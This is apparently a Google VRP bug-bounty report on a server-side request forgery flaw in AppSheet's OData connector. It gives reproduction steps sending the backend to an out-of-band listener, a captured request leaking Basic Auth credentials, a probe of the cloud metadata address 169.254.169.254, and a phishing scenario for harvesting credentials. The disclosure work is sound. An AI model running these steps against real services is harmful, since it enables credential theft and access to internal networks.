# Google VRP Submission — SSRF via AppSheet OData Data Connector

---

## TITLE

**Server-Side Request Forgery in AppSheet's OData Data Connector — Confirmed Outbound Request from GCP Backend with Credential and Internal Trace-Header Leakage**

---

## AFFECTED ASSET

```
https://appsheet.com  (Account → Add OData connection information → "Test")
```

- **Product:** AppSheet (Google Cloud)
- **Component:** OData data connector — server-side metadata-validation HTTP client
  (.NET `Microsoft.OData.Client`, both OData v2 and v4 code paths)
- **Backend IP observed:** `35.203.182.241` (GCP)
- **In scope per `config/scope.yaml`:** yes — matches `*.appsheet.com`
- **Severity:** High
- **CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

---

## SUMMARY

When a user configures an OData data source in AppSheet (Account → "Add OData
connection information") and clicks **Test**, AppSheet's backend makes a
server-side HTTP(S) request to the user-supplied **OData Service Root URL** to
fetch `/$metadata`. No restriction (IP blocklist/allowlist, metadata-endpoint
filter) is applied to the destination of this request.

Pointing the URL at an attacker-controlled server confirms full SSRF: the
attacker's server receives a genuine GCP-originated HTTP request, including:

- The OData **`Username`/`Password` entered in the form, forwarded verbatim** as
  an `Authorization: Basic` header — i.e., any credentials a user enters for what
  they believe is their own OData source are sent to whatever URL is configured.
- An internal **`Traceparent`** header (W3C distributed-tracing format), confirming
  this is a genuine backend-initiated request and incidentally exposing the
  presence/format of AppSheet's internal tracing infrastructure.

Separately, pointing the URL at `https://169.254.169.254` (GCP's metadata IP)
produces a TLS-negotiation failure rather than the client-side "must use HTTPS"
rejection AppSheet returns for plain `http://` URLs — this is the signature of a
TCP connection that was actually opened to `169.254.169.254:443` and then failed
at the TLS handshake (IMDS serves plaintext HTTP only, no certificate). This
shows the link-local metadata address is reachable from the AppSheet backend pod
at the network layer. **No metadata token, redirect chain, or further internal
port probing was attempted** — this is reported as a reachability finding, not a
confirmed credential-extraction path.

---

## STEPS TO REPRODUCE

```bash
# 1. Start an OOB HTTP listener (interactsh or equivalent)
interactsh-client -server oast.pro
# Note the issued domain, e.g. d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro

# 2. Log into AppSheet with a free account
#    Navigate to: https://appsheet.com/Account/ODataAuthInfo
#    (or: App Editor → Data → Add data source → OData)

# 3. Fill the OData form:
#    OData Version: 4.0
#    OData Service Root URL: https://<your-oob-domain>
#    Username: testuser
#    Password: testpass1234
#    Click "Test"

# 4. Observe the OOB listener
```

**Expected interaction (observed):**
```
DNS (A/AAAA)  from 192.178.118.8x  — Google LLC AS15169 (Google resolver)
HTTP GET      from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

Reproducible with a free AppSheet account, no paid plan required, in under five
minutes.

---

## PROOF

**Full HTTP request received at the attacker-controlled OOB server:**

```http
GET /$metadata HTTP/1.1
Host: d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00
```

- `Authorization` decodes to `testuser:testpass1234` — exactly what was entered
  in the form, forwarded to the configured URL verbatim.
- `Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00` is a
  genuine W3C trace-context header, confirming server-side execution (this is
  not something a browser would send, and the connecting IP is GCP-owned, not
  the tester's own egress IP).

**Response content reflected back into the AppSheet UI error message**, confirming
the backend received and parsed the OOB server's response before failing:
```
"Message : A supported MIME type could not be found that matches the content type
of the response. None of the supported type(s):
'Microsoft.OData.ODataMediaType, Microsoft.OData.ODataMediaType' matches the content
type 'text/html; charset=utf-8'."
```

**IMDS TCP-reachability signal** (network-layer reachability only — no token
requested, no redirect attempted):

| Target URL | Response | Interpretation |
|---|---|---|
| `http://169.254.169.254/` | "Connection must be established using HTTPS for security reasons" | Rejected client-side before any network call |
| `https://169.254.169.254` | "The SSL connection could not be established, see inner exception." | `.NET HttpRequestException` thrown **after** TCP connect — TLS handshake failed because IMDS has no certificate |

The second result is categorically different from the first and is the standard
signature of a TCP socket that opened successfully and then failed at the TLS
layer — it indicates `169.254.169.254:443` is reachable from the AppSheet backend
pod, not that any metadata content was retrieved.

---

## ROOT CAUSE

The OData connector's backend HTTP client (`Microsoft.OData.Client`, used for
both OData v2 and v4) fetches the user-configured Service Root URL server-side
to validate metadata, with no destination filtering — no blocklist for
link-local (`169.254.0.0/16`), loopback, or RFC1918 ranges, and no allowlist
restricting requests to public, non-internal hosts. The same client also forwards
the configured Basic Auth credentials and includes internal request-tracing
headers on the outbound call without distinguishing "trusted internal request"
context from "arbitrary user-supplied destination."

---

## IMPACT

**Confirmed:**
- Full SSRF — AppSheet's GCP backend (`35.203.182.241`) makes an outbound HTTP
  request to any attacker-supplied URL on demand, via an authenticated but
  unprivileged (free-tier) action.
- Any credentials a user enters into the OData form are sent to whatever URL is
  configured — including in a phishing scenario where an attacker distributes an
  OData "connector template" that points at the attacker's server, harvesting
  victims' real third-party OData credentials with no further interaction
  beyond clicking "Test"/"Save".
- Internal `Traceparent` trace-ID header leaked to an external, attacker-controlled
  server on every request.
- Response content-type from the attacker's server is reflected into AppSheet's
  UI error message, providing a (weak) response-based oracle for the SSRF.

**Documented as a risk, not exploited:**
- The GCP metadata service IP (`169.254.169.254:443`) is TCP-reachable from the
  AppSheet backend pod that services this connector (TLS handshake failure, not
  connection refused/timeout). This indicates the backend network does not block
  egress to the metadata address at the IP/firewall layer; HTTPS-only enforcement
  on the user-supplied URL field and IMDS being HTTP-only happen to be the only
  reasons full metadata access was not demonstrated. **No metadata token was
  requested, no HTTP→HTTPS/HTTPS→HTTP redirect chaining was attempted, and no
  other internal hosts/ports were probed during this engagement** — per
  engagement scope, this report stops at documented reachability.

---

## CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Triggered remotely via the AppSheet web UI |
| Attack Complexity | Low | Single form submission, no race condition or timing |
| Privileges Required | Low | Requires a free, authenticated AppSheet account |
| User Interaction | None | No victim interaction needed for the self-SSRF path |
| Scope | Changed | The vulnerable component (OData connector HTTP client) exposes a different security authority (AppSheet's internal GCP backend network) than the one enforcing the connector's own access controls |
| Confidentiality | High | Confirmed exfiltration of user-entered Basic Auth credentials and an internal trace header to an attacker-controlled host |
| Integrity | None | No data modification demonstrated |
| Availability | None | No availability impact demonstrated |

*Note: this report does not claim or score an escalated/Critical scenario for
IMDS credential theft. That would require a redirect or protocol bypass that was
explicitly not attempted in this engagement.*

---

## REMEDIATION

1. **Block outbound requests to internal ranges** from the OData HTTP client
   before connecting: `169.254.0.0/16` (link-local/IMDS), `127.0.0.0/8`
   (loopback), RFC1918 private ranges, and `metadata.google.internal`. Resolve
   DNS first and validate the resulting IP, not just the hostname string.
2. **Do not forward user-supplied credentials or internal tracing headers
   (`Traceparent`, etc.) without restricting the destination** to a validated,
   non-internal host first.
3. **Strip response content/content-type details from user-facing error
   messages** — the current MIME-type error leaks whether the backend
   successfully connected to and received a response from the configured URL,
   which is useful for SSRF confirmation/blind probing.
4. Apply the same destination validation consistently across both OData v2 and
   v4 client code paths, and across the metadata-fetch and data-fetch code
   paths (only the metadata path was confirmed in this engagement).

---

## DEDUPLICATION

The original investigation notes referenced **CVE-2023-4212** as a prior AppSheet
SSRF. On verification, **CVE-2023-4212 does not relate to AppSheet or Google
Cloud at all** — it is a command-injection vulnerability in Trane
XL824/XL850/XL1050/Pivot thermostats. That citation was a misattribution in the
working notes and is not used as a dedup basis here.

The actual relevant prior disclosure is **David Nechuta's December 2021 Google
VRP-rewarded report**, "SSRF vulnerability in AppSheet"
(https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html),
which used AppSheet's **Workflows/Bots "Run a webhook" automation action** to
SSRF to the GCP metadata service via a POST→GET redirect, retrieving a live
service-account access token. Google's fix blocked the older metadata service
deployment and stripped the `Metadata-Flavor` header from being set as a custom
webhook header.

This finding (F002) is a **different code path and a different bug**, not a
regression of the 2021 issue:

| | Nechuta 2021 (fixed) | F002 (this report) |
|---|---|---|
| Feature | Workflows/Bots → "Run a webhook" action | OData data connector "Test" |
| HTTP client | Webhook executor | `Microsoft.OData.Client` (v2 and v4) |
| Confirmed leak | IMDS access token via redirect | User Basic Auth credentials + `Traceparent` header, direct (no redirect) |
| IMDS status | Token retrieved (fixed in 2021) | TCP-reachable, TLS fails — not retrieved, not attempted further |
| Redirect behavior | POST→GET redirect to IMDS succeeded (2021) | HTTPS→HTTP cross-scheme redirect blocked by .NET `HttpClient` (tested in a prior session of this engagement, not re-attempted here) |

Because the 2021 fix was scoped to the webhook executor and the older metadata
deployment, it does not appear to have touched the OData connector's HTTP client
at all — this report demonstrates that connector independently makes
unrestricted outbound requests, leaks credentials and an internal header, and
reaches the same link-local metadata address at the network layer.

---

## REFERENCES

- CWE-918: Server-Side Request Forgery (SSRF)
- GCP IMDS documentation: https://cloud.google.com/compute/docs/metadata/overview
- Prior related disclosure (not a duplicate, see Deduplication above):
  https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html

---
<!-- Internal (do not submit): dedup status, discovery method, related findings -->
- Dedup status: novel — distinct connector/code path from the 2021 fixed issue;
  CVE-2023-4212 confirmed unrelated/misattributed and dropped as a reference
- Discovered via: Phase 3 manual testing of AppSheet data connectors, OOB
  (interactsh) confirmation
- Related findings: F001 (staging API auth bypass) — same theme of
  connector/staging surfaces lagging behind production-grade controls
- Source finding: `results/appsheet.com/findings/F002-odata-ssrf.md`
- OOB interaction timestamp: 2026-06-15 20:03:15 UTC; backend IP 35.203.182.241
